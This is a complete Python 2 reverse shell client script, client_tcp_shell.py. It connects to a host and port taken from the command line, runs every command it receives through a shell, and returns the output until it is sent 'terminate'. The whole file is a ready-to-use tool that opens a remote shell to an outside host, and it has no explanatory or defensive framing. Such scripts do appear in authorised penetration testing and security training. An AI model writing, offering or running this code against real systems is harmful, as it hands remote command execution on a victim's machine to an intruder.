#!/usr/bin/env python

import socket
import subprocess
import os
import sys

if len(sys.argv) <=2:
 print "Usage python client_tcp_shell.py <host> <port>"
 exit()

nbytes = 1024

def tcp_reverse_client():

 host = sys.argv[1]
 port = int(sys.argv[2])
 socket_object = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 socket_object.connect((host , port))
 while True:
  command = socket_object.recv(nbytes)
  if 'terminate' in command:
   socket_object.close()
   break

  else:
   cmd = subprocess.Popen(command , shell=True , stdout=subprocess.PIPE , stderr=subprocess.PIPE , stdin=subprocess.PIPE)
   socket_object.send( cmd.stdout.read() )
   socket_object.send( cmd.stderr.read() )

tcp_reverse_client()
